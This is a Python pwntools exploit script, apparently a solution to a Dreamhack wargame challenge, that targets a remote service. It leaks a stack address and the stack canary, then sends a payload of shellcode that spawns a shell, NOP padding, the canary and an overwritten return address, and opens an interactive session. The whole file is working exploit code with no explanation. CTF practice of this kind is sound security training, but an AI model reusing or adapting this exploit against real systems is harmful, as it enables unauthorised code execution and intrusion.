from pwn import *

context.arch = 'amd64'

p=remote('host3.dreamhack.games', 9188)


canary_input = b'A'*(0x60-0x8)

canary = b''

p.recvuntil(b'0x')

ret_add = p.recv(12)

p.sendlineafter(b'put: ',canary_input)

p.recvline()

canary = b'\x00'
canary += p.recv(7)

ret_add = p64(int(ret_add,16))

totlen = 0x60-0x8
payload = b''
payload += asm(shellcraft.sh())
payload += b'\x90'*(totlen-len(payload))
payload += canary
payload += b'\x90'*8
payload += ret_add

p.sendlineafter(b'put: ',payload)
p.interactive()
